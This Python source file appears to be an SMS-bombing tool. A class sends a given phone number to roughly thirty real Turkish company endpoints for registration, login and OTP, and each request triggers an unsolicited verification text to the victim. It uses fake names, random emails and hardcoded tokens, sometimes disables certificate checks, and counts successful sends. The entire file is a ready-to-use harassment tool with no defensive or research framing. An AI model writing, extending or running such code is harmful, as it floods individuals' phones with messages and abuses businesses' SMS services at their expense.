import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style

class SendSms():
    adet = 0
    
    def __init__(self, phone, mail):
        self.phone = str(phone)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"


    # dsmartgo.com.tr
    def Dsmartgo(self):
        dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	"__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	"IsSubscriber": "true",
        	"__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	"Mobile": self.phone,
        }, cookies={
        		"__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		"_ga": "GA1.3.1016548678.1638216163",
        		"_gat": "1",
        		"_gat_gtag_UA_18913632_14": "1",
        		"_gid": "GA1.3.1214889554.1638216163",
        		"ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		"ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	})
        try:
            BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> dsmartgo.com.tr")
        except AttributeError:
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> dsmartgo.com.tr")
            self.adet += 1
        

   

    
        

    #naosstars.com
    def NaosStars(self):
        try:
            naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                "email": self.mail,
                "first_name": "Memati",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "date_of_birth": "1975-12-31",
                "phone": f"0{self.phone}",
                "gender": "male",
                "kvkk": "true",
                "contact": "true",
                "confirm": "true"
            })
            if naosstars.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> shop.naosstars.com")
                self.adet += 1 
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> shop.naosstars.com")
          
        
    #wmf.com.tr
    def Wmf(self):
        try:
            wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                "confirm": "true",
                "date_of_birth": "1956-03-01",
                "email": self.mail,
                "email_allowed": "true",
                "first_name": "Memati",
                "gender": "male",
                "last_name": "Bas",
                "password": "31ABC..abc31",
                "phone": f"0{self.phone}"
            })
            if wmf.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> wmf.com.tr")
                self.adet += 1   
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> wmf.com.tr")
         
    
    
    
    
    #bim
    def Bim(self):
        try:
            bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": self.phone})
            if bim.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bim.veesk.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bim.veesk.net")
            
        
   
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        try:
            json={"operationName": "GENERATE_OTP", 
                        "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                        "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                    "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                    "phone": self.phone
                                    }
                        }
            tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
            if tiklagelsin.json()["data"]["generateOtp"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
            
    
    #migros.com.tr
    def Migros(self):
        try:
            migros = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp",  json={"phoneNumber": self.phone})
            if migros.json()["successful"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rest.migros.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rest.migros.com.tr")
            
    
    #a101.com.tr
    def A101(self):
        try:
            url = "https://www.a101.com.tr:443/users/otp-login/"
            data = {"phone": f"0{self.phone}", "next": "/a101-kapida"}
            r = requests.post(url,data=data)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> a101.com.tr")
                self.adet += 1
            else:
                raise 
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> a101.com.tr")


    
            
            
    #sakasu.com.tr
    def Sakasu(self):
        try:
            data = {"phone": self.phone}
            su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
            if su.json()["status"] == "ok":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> sakasu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> sakasu.com.tr")
            
    
    #rentiva.com
    def Rentiva(self): 
        try:
            url = "https://rentiva.com:443/api/Account/Login"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
            json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": self.phone, "type": 1}
            rentiva = requests.post(url, headers=headers, json=json)
            if rentiva.json()["success"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> rentiva.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> rentiva.com")
            
    
   
            
            
    

            
    #loncamarket.com
    def Lonca(self):
        try:
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json; charset=utf-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://www.loncamarket.com", "Dnt": "1", "Referer": "https://www.loncamarket.com/bayi/basvuru/sozlesme", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers", "Connection": "close"}
            json={"Address": self.phone, "ConfirmationType": 0}
            lonca = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", headers=headers, json=json, verify=False, timeout=3)
            if lonca.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> loncamarket.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> loncamarket.com")   
            
    
    #dgnonline.com
    def Dgn(self):
        try:
            url = "https://odeme.dgnonline.com:443/index.php?route=ajax/smsconfirm&type=send&ajax=1"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "https://odeme.dgnonline.com", "Dnt": "1", "Referer": "https://odeme.dgnonline.com/?bd=1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Te": "trailers"}
            data = {"loginIdentityNumber": "00000000000", "loginMobileNumber": self.phone}
            dgn = requests.post(url, headers=headers, data=data)
            if dgn.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> odeme.dgnonline.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> odeme.dgnonline.com")  
            
    
    
            
             
    
    
    
    #mopas.com.tr
    def Mopas(self):
        try:
            r = requests.get(f"https://mopas.com.tr/sms/activation?mobileNumber={self.phone}&pwd=&checkPwd=")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mopas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mopas.com.tr")
            
    
    #icq.net
    def Icq(self):
        try:
            url = "https://u.icq.net:443/api/v92/rapi/auth/sendCode"
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0", "Accept": "*/*", "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "Origin": "https://web.icq.com", "Dnt": "1", "Referer": "https://web.icq.com/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "cross-site", "Te": "trailers"}
            json={"params": {"application": "icq", "devId": "ic1rtwz1s1Hj1O0r", "language": "en-US", "phone": f"90{self.phone}", "route": "sms"}, "reqId": "25299-1669396271"}
            r = requests.post(url, headers=headers, json=json)
            if r.json()["status"]["code"] == 20000:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> u.icq.net")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> u.icq.net")
            
    
    
            

   
            
    
   
    
    #idealdata.com.tr
    def Osmanlideal(self):
        try:
            r = requests.get(f"https://osmgck.idealdata.com.tr:7850/X%02REQ_SMSDEMO%02{self.mail}%020{self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> osmgck.idealdata.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> osmgck.idealdata.com.tr")
            
    
    
            
    
    #suiste.com
    def Suiste(self):
        try:
            url = "https://suiste.com:443/api/auth/code"
            headers = {"Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "User-Agent": "suiste/1.5.10 (com.mobillium.suiste; build:1228; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate"}
            data = {"action": "register", "gsm": self.phone}
            r = requests.post(url, headers=headers, data=data)
            if r.json()["code"] == "common.success":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> suiste.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> suiste.com")
            
            
    
            
   
                
    
    #KimGbIster
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn": f"90{self.phone}"})
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> 3uptzlakwi.execute-api.eu-west-1.amazonaws.com")


    
            
            
    
            
            
    
            
             
    #mogazmobilapinew.aygaz.com.tr
    def Mogaz(self):
        try:
            url = "https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister"
            json={"address": "", "birthDate": "31-08-1975", "city": 0, "deviceCode": "839C5FAF-A7C1-2CDA--6F5414AD2228", "district": 0, "email": self.mail, "isUserAgreement": True, "name": "Memati", "password": "", "phone": self.phone, "productType": 1, "subscription": True, "surname": "Bas"}
            r = requests.post(url, json=json)
            if (r.json()["messageCode"]) == "OK":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mogazmobilapinew.aygaz.com.tr")
            
            
   
            
    
    #petrolofisi.com.tr
    def PetrolOfisi(self):
        try:
            url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "Petrol%20Ofisi/78 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Channel": "IOS", "Accept-Language": "tr", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
            json={"approvedContractVersion": "v1", "approvedKvkkVersion": "v1", "contractPermission": True, "deviceId": "", "etkContactPermission": True, "kvkkPermission": True, "mobilePhone": f"0{self.phone}", "name": "Memati", "plate": "31ABC31", "positiveCard": "", "referenceCode": "", "surname": "Bas"}
            r = requests.post(url, headers=headers, json=json)
            if r.status_code == 204:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilapi.petrolofisi.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilapi.petrolofisi.com.tr")
            
    
    #totalistasyonlari.com.tr
    def Total(self):
        try:
            r = requests.post(f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={self.phone}&api_key=GetDocuments%0A", verify=False)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.totalistasyonlari.com.tr")
            
            
    #opet.com.tr
    def Opet(self):
        try:
            url = "https://api.opet.com.tr:443/api/authentication/register"
            json={"abroadcompanies": ["1", "2", "3"], "birthdate": "1975-08-31T22:00:00.000Z", "cardNo": None, "commencisRadio": "true", "email": self.mail, "firstName": "Memati", "googleRadio": "true", "lastName": "Bas", "microsoftRadio": "true", "mobilePhone": str(self.phone), "opetKvkkAndEtk": True, "plate": "31ABC31"}
            r = requests.post(url, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.opet.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.opet.com.tr")


   
            

    #heymobility.tech
    def Hey(self):
        try:
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
            r = requests.post(f"https://heyapi.heymobility.tech:443/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}", headers=headers)
            if (r.json()["IsSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> heyapi.heymobility.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> heyapi.heymobility.tech")
            

    #tazi.tech
    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json;charset=utf-8", "Accept-Encoding": "gzip, deflate", "User-Agent": "Taz%C4%B1/3 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}
            json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["kod"]) == "0000":
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapiv2.tazi.tech")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapiv2.tazi.tech")
            
    
    
    
    #n11.com
    def N11(self):
        try:
            url = "https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3"
            headers = {"Mobileclient": "IOS", "Content-Type": "application/json", "Accept": "*/*", "Authorization": "api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F", "Clientversion": "163", "Accept-Encoding": "gzip, deflate", "User-Agent": "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr-TR,tr;q=0.9", "Connection": "close"}
            json={"__hapc": "", "_deviceId": "696B171-031N-4131-315F-9A76BF60368F", "channel": "MOBILE_IOS", "countryCode": "+90", "email": self.mail, "gsmNumber": self.phone, "userType": "BUYER"}
            r = requests.post(url, headers=headers, json=json)
            if (r.json()["isSuccess"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobileapi.n11.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobileapi.n11.com")
            
    
   


    


    #sakasu.com.tr
    def Saka(self):
        try:
            url = "https://mobilcrm2.saka.com.tr:443/api/customer/login"
            json={"gsm": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["status"]) == 1 :
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobilcrm2.saka.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobilcrm2.saka.com.tr")
            
    
    #gofody.com
    def Gofody(self):
        try:
            url = "https://backend.gofody.com:443/api/v1/enduser/register/"
            json={"country_code": "90", "phone": self.phone}
            r = requests.post(url, json=json)
            if (r.json()["success"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> backend.gofody.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> backend.gofody.com")


    
            
            
   
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")
            
    
   
            
            
    
    
    
    
            
    
            
        
    #marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
            
    
   
    
   
